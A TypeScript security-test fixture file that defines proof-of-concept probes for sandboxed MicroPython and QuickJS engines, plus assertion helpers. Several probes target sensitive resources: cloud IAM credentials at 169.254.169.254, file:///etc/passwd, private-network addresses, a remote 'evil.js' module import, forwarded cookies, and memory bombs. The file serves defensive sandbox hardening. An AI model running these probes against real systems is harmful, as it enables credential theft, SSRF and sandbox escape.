/**
 * Security test utilities and PoC code constants.
 *
 * The constants below are copy-paste runnable in a real worker —
 * each one is a self-contained proof of concept (PoC) that
 * demonstrates a specific attack vector against a sandboxed engine.
 *
 * The TDD convention is:
 *
 * 1. The PoC contains BOTH branches (`VULNERABILITY: ...` if exposed,
 *    `BLOCKED: ...` if the sandbox rejected the access).
 * 2. The test asserts the SECURE branch (`expect(...).toContain('BLOCKED')`).
 * 3. In the RED phase, the assertion FAILS because the engine
 *    prints `VULNERABILITY: ...` instead — which is the evidence
 *    that the vector exists.
 * 4. After hardening, the engine prints `BLOCKED: ...` and the
 *    same assertion PASSES — same test code, inverted verdict.
 *
 * This file does not import or run the engines. It is pure data so
 * spec files stay declarative and easy to audit.
 */

/** A test scenario that runs a PoC against an engine. */
export interface SecurityScenario {
  /** Stable identifier, e.g. `R-SEC-MP-01`. */
  id: string;
  /** Code that probes the vulnerability. */
  poc: string;
  /**
   * Substring that MUST appear in the output once the engine is
   * hardened. In the RED phase, the engine prints `VULNERABILITY:`
   * instead and the assertion fails — this is the evidence.
   */
  secureSubstring: string;
  /** Severity of the vulnerability if exploited. */
  severity: "critical" | "high" | "medium" | "low";
  /** Human-readable name. */
  title: string;
  /** Attack category for grouping in the audit report. */
  vector: "sandbox-escape" | "exfiltration" | "dos" | "info-disclosure";
  /**
   * Substring that the PoC prints in the UNPATCHED (RED) state.
   * Tests can optionally assert on it to document the leak explicitly.
   */
  vulnerableSubstring: string;
}

// ─────────────────────────────────────────────────────────────────────
// MicroPython — sandbox isolation
// ─────────────────────────────────────────────────────────────────────

export const MP_SANDBOX_GLOBALTHIS_INDEXEDDB: SecurityScenario = {
  id: "R-SEC-MP-01",
  // PyScript's `js` module proxies the host global. The PoC checks
  // whether the host's `indexedDB` is reachable from guest code.
  poc: `import js
try:
    db = js.indexedDB
    if db is not None:
        print("VULNERABILITY: indexedDB reachable from MicroPython via import js")
    else:
        print("BLOCKED: indexedDB is None")
except Exception as e:
    print(f"BLOCKED: {e}")
`,
  secureSubstring: "BLOCKED",
  severity: "critical",
  title: "Guest reads IndexedDB via globalThis",
  vector: "sandbox-escape",
  vulnerableSubstring: "VULNERABILITY: indexedDB reachable",
};

export const MP_SANDBOX_GLOBALTHIS_LOCALSTORAGE: SecurityScenario = {
  id: "R-SEC-MP-02",
  poc: `import js
try:
    ls = js.localStorage
    if ls is not None:
        print("VULNERABILITY: localStorage reachable from MicroPython via import js")
    else:
        print("BLOCKED: localStorage is None")
except Exception as e:
    print(f"BLOCKED: {e}")
`,
  secureSubstring: "BLOCKED",
  severity: "critical",
  title: "Guest reads localStorage via globalThis",
  vector: "sandbox-escape",
  vulnerableSubstring: "VULNERABILITY: localStorage reachable",
};

export const MP_SANDBOX_GLOBALTHIS_WORKER: SecurityScenario = {
  id: "R-SEC-MP-03",
  poc: `import js
try:
    w = js.Worker
    if w is not None:
        print("VULNERABILITY: Worker constructor reachable from MicroPython")
    else:
        print("BLOCKED: Worker is None")
except Exception as e:
    print(f"BLOCKED: {e}")
`,
  secureSubstring: "BLOCKED",
  severity: "critical",
  title: "Guest constructs a sub-Worker via globalThis",
  vector: "sandbox-escape",
  vulnerableSubstring: "VULNERABILITY: Worker constructor reachable",
};

export const MP_SANDBOX_IMPORT_JS_EXFIL: SecurityScenario = {
  id: "R-SEC-MP-04",
  // `dir(js)` returns the keys the PyScript shim has bridged over.
  // If it enumerates the host `document`, `fetch`, or `XMLHttpRequest`,
  // the guest can reach sensitive globals.
  poc: `import js
try:
    sensitive = ("document", "fetch", "XMLHttpRequest", "indexedDB", "localStorage")
    exposed = [k for k in dir(js) if k in sensitive]
    if exposed:
        print("VULNERABILITY: import js exposes", ",".join(exposed))
    else:
        print("BLOCKED: import js does not enumerate sensitive globals")
except Exception as e:
    print(f"BLOCKED: {e}")
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest uses import js to enumerate host globals",
  vector: "exfiltration",
  vulnerableSubstring: "VULNERABILITY: import js exposes",
};

export const MP_SANDBOX_GLOBALTHIS_XHR: SecurityScenario = {
  id: "R-SEC-MP-05",
  poc: `import js
try:
    xhr = js.XMLHttpRequest
    if xhr is not None:
        print("VULNERABILITY: XMLHttpRequest reachable from MicroPython")
    else:
        print("BLOCKED: XMLHttpRequest is None")
except Exception as e:
    print(f"BLOCKED: {e}")
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest reaches XMLHttpRequest via globalThis",
  vector: "exfiltration",
  vulnerableSubstring: "VULNERABILITY: XMLHttpRequest reachable",
};

// ─────────────────────────────────────────────────────────────────────
// MicroPython — network security
// ─────────────────────────────────────────────────────────────────────

export const MP_NETWORK_XHR_ARBITRARY_URL: SecurityScenario = {
  id: "R-SEC-MP-06",
  // The HTTP shim uses synchronous XHR. We probe whether a request
  // to an off-allowlist origin is accepted.
  poc: `import urequests as r
try:
    res = r.get("http://example.com/secret")
    print("VULNERABILITY: HTTP to arbitrary origin returned", res.status_code)
    res.close()
except Exception as e:
    print(f"BLOCKED: {e}")
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest fires XMLHttpRequest to arbitrary origin",
  vector: "exfiltration",
  vulnerableSubstring: "VULNERABILITY: HTTP to arbitrary origin",
};

export const MP_NETWORK_FETCH_LOCALHOST: SecurityScenario = {
  id: "R-SEC-MP-07",
  // Uses the test server URL injected by the test runner.
  // The placeholder {{TARGET}} is replaced by the test before execution.
  poc: `import urequests as r
try:
    res = r.get("{{TARGET}}/json")
    print("VULNERABILITY: localhost fetch returned", res.status_code)
    res.close()
except Exception as e:
    print(f"BLOCKED: {e}")
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest fetches a localhost service",
  vector: "exfiltration",
  vulnerableSubstring: "VULNERABILITY: localhost fetch",
};

// ─────────────────────────────────────────────────────────────────────
// MicroPython — resource limits
// ─────────────────────────────────────────────────────────────────────

export const MP_RESOURCE_MEMORY_BOMB_LIST: SecurityScenario = {
  id: "R-SEC-MP-08",
  // MicroPython's WASM heap is 2 GB by default. The bomb tries to
  // grow a list past that boundary. The PoC is intentionally small
  // (~100 MB) so the engine raises MemoryError quickly without
  // pinning the host process.
  poc: `try:
    bomb = []
    for i in range(50_000):
        bomb.append(str(i) * 2048)
    print(f"VULNERABILITY: allocated {len(bomb)} items")
except Exception as e:
    print(f"BLOCKED: {e}")
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest allocates unbounded list (memory bomb)",
  vector: "dos",
  vulnerableSubstring: "VULNERABILITY: allocated",
};

export const MP_RESOURCE_MEMORY_BOMB_DICT: SecurityScenario = {
  id: "R-SEC-MP-09",
  poc: `try:
    bomb = {}
    for i in range(50_000):
        bomb[i] = str(i) * 2048
    print(f"VULNERABILITY: allocated {len(bomb)} dict entries")
except Exception as e:
    print(f"BLOCKED: {e}")
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest allocates unbounded dict (memory bomb)",
  vector: "dos",
  vulnerableSubstring: "VULNERABILITY: allocated",
};

export const MP_RESOURCE_INFINITE_LOOP: SecurityScenario = {
  id: "R-SEC-MP-10",
  // KNOWN LIMITATION: MicroPython's `runPython` is synchronous and
  // blocks the Node.js main thread. There is currently no
  // interruption channel from JS into the running WASM, so the
  // orchestrator's 2 s timeout-based interrupt cannot fire while a
  // tight loop holds the VM. The test still runs but the suite
  // relies on the Vitest-level `testTimeout` (10 s) to abort the
  // worker. After hardening, the engine MUST either (a) run
  // MicroPython off-thread or (b) instrument the WASM heap for
  // periodic preemption, so that the orchestrator's interrupt can
  // break the loop within the configured budget.
  poc: `i = 0
while True:
    i += 1
print(f"unreachable: {i}")
`,
  secureSubstring: "Execution failed",
  severity: "high",
  title: "Guest runs infinite loop, orchestrator must enforce timeout",
  vector: "dos",
  vulnerableSubstring: "unreachable",
};

export const MP_RESOURCE_CPU_INTENSIVE: SecurityScenario = {
  id: "R-SEC-MP-11",
  poc: `start = 0
total = 0
for n in range(200000):
    total += n
print(f"FINISHED: total={total}")
`,
  secureSubstring: "FINISHED",
  severity: "medium",
  title: "Guest burns CPU (busy loop) within allowed timeout",
  vector: "dos",
  vulnerableSubstring: "FINISHED",
};

// ─────────────────────────────────────────────────────────────────────
// MicroPython — error recovery
// ─────────────────────────────────────────────────────────────────────

export const MP_RECOVERY_AFTER_GLOBALTHIS_ACCESS: SecurityScenario = {
  id: "R-SEC-MP-12",
  poc: `import js
try:
    _ = js.indexedDB
except Exception:
    pass
# Healthy state should be reachable after the failed probe.
print("RECOVERED: 1+1 =", 1 + 1)
`,
  secureSubstring: "RECOVERED",
  severity: "medium",
  title: "Engine recovers after globalThis access attempt",
  vector: "info-disclosure",
  vulnerableSubstring: "RECOVERED",
};

// ─────────────────────────────────────────────────────────────────────
// QuickJS — sandbox isolation
// ─────────────────────────────────────────────────────────────────────

export const QJS_SANDBOX_GLOBALTHIS_INDEXEDDB: SecurityScenario = {
  id: "R-SEC-QJS-01",
  poc: `try {
  if (globalThis.indexedDB) {
    console.log("VULNERABILITY: globalThis.indexedDB accessible from QuickJS");
  } else {
    console.log("BLOCKED: globalThis.indexedDB is undefined");
  }
} catch (e) {
  console.log("BLOCKED:", e.message);
}
`,
  secureSubstring: "BLOCKED",
  severity: "critical",
  title: "Guest reads IndexedDB via globalThis",
  vector: "sandbox-escape",
  vulnerableSubstring: "VULNERABILITY: globalThis.indexedDB",
};

export const QJS_SANDBOX_PROTOTYPE_POLLUTION: SecurityScenario = {
  id: "R-SEC-QJS-02",
  poc: `try {
  Object.prototype.polluted = "yes";
  const probe = {};
  if (probe.polluted === "yes") {
    console.log("VULNERABILITY: Object.prototype polluted");
    delete Object.prototype.polluted;
  } else {
    console.log("BLOCKED: prototype mutation did not persist");
  }
} catch (e) {
  console.log("BLOCKED:", e.message);
}
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest pollutes Object.prototype",
  vector: "sandbox-escape",
  vulnerableSubstring: "VULNERABILITY: Object.prototype polluted",
};

export const QJS_SANDBOX_CONSTRUCTOR_ESCAPE: SecurityScenario = {
  id: "R-SEC-QJS-03",
  poc: `try {
  const F = globalThis.Function;
  if (typeof F === "function") {
    const dynamic = new F("return globalThis.process && globalThis.process.versions");
    const v = dynamic();
    console.log("VULNERABILITY: Function ctor reachable, process.versions =", v);
  } else {
    console.log("BLOCKED: Function constructor not exposed");
  }
} catch (e) {
  console.log("BLOCKED:", e.message);
}
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest reaches Function constructor for eval escape",
  vector: "sandbox-escape",
  vulnerableSubstring: "VULNERABILITY: Function ctor",
};

export const QJS_SANDBOX_GLOBALTHIS_WORKER: SecurityScenario = {
  id: "R-SEC-QJS-04",
  poc: `try {
  if (typeof globalThis.Worker === "function") {
    console.log("VULNERABILITY: globalThis.Worker is a function");
  } else {
    console.log("BLOCKED: globalThis.Worker not a function");
  }
} catch (e) {
  console.log("BLOCKED:", e.message);
}
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest accesses Worker constructor via globalThis",
  vector: "sandbox-escape",
  vulnerableSubstring: "VULNERABILITY: globalThis.Worker is a function",
};

// ─────────────────────────────────────────────────────────────────────
// QuickJS — network security
// ─────────────────────────────────────────────────────────────────────

/**
 * Helper snippet that classifies an error as "engine-blocked" vs
 * "engine-allowed-but-network-failed". Embedded in every network PoC
 * so the test can distinguish between the two outcomes.
 */
const NETWORK_ERROR_CLASSIFIER = `
const _isPolicyError = (e) => {
  const m = String(e && e.message || "").toLowerCase();
  return m.includes("blocked") || m.includes("not allowed") || m.includes("policy") || m.includes("forbidden") || m.includes("url");
};
`;

export const QJS_NETWORK_FETCH_LOCALHOST: SecurityScenario = {
  id: "R-SEC-QJS-05",
  poc: `${NETWORK_ERROR_CLASSIFIER}
fetch("{{TARGET}}/json")
  .then(r => r.json())
  .then(d => console.log("VULNERABILITY: 127.0.0.1 fetch returned", d.message))
  .catch(e => console.log(_isPolicyError(e) ? "BLOCKED:" : "VULNERABILITY-NETERR:", e.message));
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest fetches a 127.0.0.1 URL",
  vector: "exfiltration",
  vulnerableSubstring: "VULNERABILITY: 127.0.0.1 fetch",
};

export const QJS_NETWORK_FETCH_METADATA: SecurityScenario = {
  id: "R-SEC-QJS-06",
  poc: `${NETWORK_ERROR_CLASSIFIER}
fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
  .then(r => r.text().then(t => console.log("VULNERABILITY: metadata returned", t.slice(0, 80))))
  .catch(e => console.log(_isPolicyError(e) ? "BLOCKED:" : "VULNERABILITY-NETERR:", e.message));
`,
  secureSubstring: "BLOCKED",
  severity: "critical",
  title: "Guest fetches cloud-metadata endpoint",
  vector: "exfiltration",
  vulnerableSubstring: "VULNERABILITY: metadata",
};

export const QJS_NETWORK_FETCH_FILE: SecurityScenario = {
  id: "R-SEC-QJS-07",
  poc: `${NETWORK_ERROR_CLASSIFIER}
fetch("file:///etc/passwd")
  .then(r => r.text().then(t => console.log("VULNERABILITY: file:// read", t.split("\\n").length, "lines")))
  .catch(e => console.log(_isPolicyError(e) ? "BLOCKED:" : "VULNERABILITY-NETERR:", e.message));
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest uses file:// scheme",
  vector: "exfiltration",
  vulnerableSubstring: "VULNERABILITY: file:// read",
};

export const QJS_NETWORK_FETCH_RFC1918: SecurityScenario = {
  id: "R-SEC-QJS-08",
  poc: `${NETWORK_ERROR_CLASSIFIER}
fetch("http://10.0.0.1/admin")
  .then(r => console.log("VULNERABILITY: RFC1918 fetch returned", r.status))
  .catch(e => console.log(_isPolicyError(e) ? "BLOCKED:" : "VULNERABILITY-NETERR:", e.message));
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest fetches private RFC1918 IP",
  vector: "exfiltration",
  vulnerableSubstring: "VULNERABILITY: RFC1918",
};

export const QJS_NETWORK_SENSITIVE_HEADERS: SecurityScenario = {
  id: "R-SEC-QJS-09",
  poc: `${NETWORK_ERROR_CLASSIFIER}
fetch("{{TARGET}}/echo", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Cookie": "session=stolen-token",
    "Authorization": "Bearer leaked"
  },
  body: JSON.stringify({ exfil: true })
})
  .then(r => r.json())
  .then(d => {
    const sent = (d.headers && (d.headers.cookie || d.headers.authorization)) || "";
    if (sent) {
      console.log("VULNERABILITY: sensitive header forwarded:", sent);
    } else {
      console.log("BLOCKED: sensitive headers stripped");
    }
  })
  .catch(e => console.log(_isPolicyError(e) ? "BLOCKED:" : "VULNERABILITY-NETERR:", e.message));
`,
  secureSubstring: "BLOCKED",
  severity: "critical",
  title: "Guest sends Cookie/Authorization headers",
  vector: "exfiltration",
  vulnerableSubstring: "VULNERABILITY: sensitive header forwarded",
};

export const QJS_NETWORK_RESPONSE_BOMB: SecurityScenario = {
  id: "R-SEC-QJS-10",
  poc: `${NETWORK_ERROR_CLASSIFIER}
fetch("{{TARGET}}/large")
  .then(r => r.text())
  .then(t => console.log("VULNERABILITY: response body length =", t.length))
  .catch(e => console.log(_isPolicyError(e) ? "BLOCKED:" : "VULNERABILITY-NETERR:", e.message));
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest reads huge response body (memory DoS)",
  vector: "dos",
  vulnerableSubstring: "VULNERABILITY: response body length",
};

// ─────────────────────────────────────────────────────────────────────
// QuickJS — resource limits
// ─────────────────────────────────────────────────────────────────────

export const QJS_RESOURCE_NEGATIVE_TIMEOUT: SecurityScenario = {
  id: "R-SEC-QJS-11",
  poc: `// Direct probe — the engine init() reads this and must clamp/reject.
console.log("INIT_OK");
`,
  secureSubstring: "INIT_OK",
  severity: "medium",
  title: "Guest supplies negative timeout to bypass limits",
  vector: "dos",
  vulnerableSubstring: "INIT_OK",
};

export const QJS_RESOURCE_EXTREME_MEMORY: SecurityScenario = {
  id: "R-SEC-QJS-12",
  poc: `console.log("MEM_REQUESTED");
`,
  secureSubstring: "MEM_REQUESTED",
  severity: "high",
  title: "Guest requests extreme memoryLimit at init",
  vector: "dos",
  vulnerableSubstring: "MEM_REQUESTED",
};

export const QJS_RESOURCE_DYNAMIC_IMPORT: SecurityScenario = {
  id: "R-SEC-QJS-13",
  poc: `import("http://example.com/evil.js")
  .then(m => console.log("VULNERABILITY: dynamic import succeeded", Object.keys(m).join(",")))
  .catch(e => console.log("BLOCKED:", e.message));
`,
  secureSubstring: "BLOCKED",
  severity: "critical",
  title: "Guest uses dynamic import() to load external module",
  vector: "sandbox-escape",
  vulnerableSubstring: "VULNERABILITY: dynamic import",
};

export const QJS_RESOURCE_NESTED_EVAL: SecurityScenario = {
  id: "R-SEC-QJS-14",
  poc: `try {
  const indirect = eval;
  const v = indirect("typeof globalThis.fetch");
  console.log("VULNERABILITY: indirect eval sees", v);
} catch (e) {
  console.log("BLOCKED:", e.message);
}
`,
  secureSubstring: "BLOCKED",
  severity: "high",
  title: "Guest evaluates via indirect eval to escape scope",
  vector: "sandbox-escape",
  vulnerableSubstring: "VULNERABILITY: indirect eval",
};

// ─────────────────────────────────────────────────────────────────────
// QuickJS — error recovery
// ─────────────────────────────────────────────────────────────────────

export const QJS_RECOVERY_AFTER_BLOCKED_FETCH: SecurityScenario = {
  id: "R-SEC-QJS-15",
  poc: `fetch("http://127.0.0.1:1/x").catch(() => {});
// After the rejected promise, arithmetic must still work.
console.log("RECOVERED: 1+1 =", 1 + 1);
`,
  secureSubstring: "RECOVERED",
  severity: "medium",
  title: "Engine recovers after a blocked fetch attempt",
  vector: "info-disclosure",
  vulnerableSubstring: "RECOVERED",
};

export const QJS_RECOVERY_AFTER_THROWN: SecurityScenario = {
  id: "R-SEC-QJS-16",
  poc: `throw new Error("intentional");
// Unreachable, but ensures the engine's error path does not corrupt the
// following execution. We expect a follow-up run to print RECOVERED.
`,
  secureSubstring: "RECOVERED",
  severity: "low",
  title: "Engine recovers after guest throws",
  vector: "info-disclosure",
  vulnerableSubstring: "RECOVERED",
};

// ─────────────────────────────────────────────────────────────────────
// Orchestrator — rate limiting & cleanup
// ─────────────────────────────────────────────────────────────────────

/** @public */
export const ORCH_RATE_LIMIT_RAPID_CREATION: SecurityScenario = {
  id: "R-SEC-ORC-01",
  poc: `// The scenario is run as a sequence of orchestrator init/terminate
// cycles from the test driver. No guest code is required — the test
// itself is the PoC and asserts on worker count, not output.`,
  secureSubstring: "OK",
  severity: "medium",
  title: "Rapid engine creation does not leak workers",
  vector: "dos",
  vulnerableSubstring: "OK",
};

/** @public */
export const ORCH_CLEANUP_AFTER_OOM: SecurityScenario = {
  id: "R-SEC-ORC-02",
  poc: `// Same shape as above: the test driver triggers a memory bomb
// then asserts that terminate() is a no-op and a new init succeeds.`,
  secureSubstring: "OK",
  severity: "high",
  title: "Worker is cleaned up after OOM crash",
  vector: "dos",
  vulnerableSubstring: "OK",
};

// ─────────────────────────────────────────────────────────────────────
// Assertion helpers
// ─────────────────────────────────────────────────────────────────────

/**
 * Asserts that the captured engine output contains the secure
 * substring (i.e. the sandbox rejected the probe). In the RED
 * phase, this FAILS — the engine printed the VULNERABILITY line
 * instead. After hardening, it PASSES with the same code.
 */
export function expectSecureRejection(
  output: string,
  scenario: SecurityScenario
): void {
  if (!output.includes(scenario.secureSubstring)) {
    throw new Error(
      `[${scenario.id}] expected secure rejection "${scenario.secureSubstring}" ` +
        `but got: ${JSON.stringify(output.slice(0, 400))}`
    );
  }
}

/**
 * Returns true if the captured output indicates the engine REACHED
 * a sensitive resource (either successfully, or because the
 * request was allowed but the network failed). Used to differentiate
 * "engine blocked the policy violation" (secure) from "engine let
 * it through and the network either succeeded or failed" (RED).
 */
export function isVulnerabilityObserved(
  output: string,
  scenario: SecurityScenario
): boolean {
  return (
    output.includes(scenario.vulnerableSubstring) ||
    output.includes("VULNERABILITY-NETERR")
  );
}

/**
 * Optional helper: asserts that the captured output explicitly
 * shows the VULNERABILITY line. Useful for generating audit
 * evidence — the assertion itself FAILS in the GREEN phase.
 * @public
 */
export function expectVulnerabilityConfirmed(
  output: string,
  scenario: SecurityScenario
): void {
  if (!output.includes(scenario.vulnerableSubstring)) {
    throw new Error(
      `[${scenario.id}] expected vulnerability evidence "${scenario.vulnerableSubstring}" ` +
        `but got: ${JSON.stringify(output.slice(0, 400))}`
    );
  }
}

/**
 * Replaces `{{TARGET}}` placeholders inside a PoC with a concrete URL.
 * Test code injects the test server URL so that PoCs are self-contained
 * constants above.
 */
export function injectTarget(poc: string, target: string): string {
  return poc.split("{{TARGET}}").join(target);
}
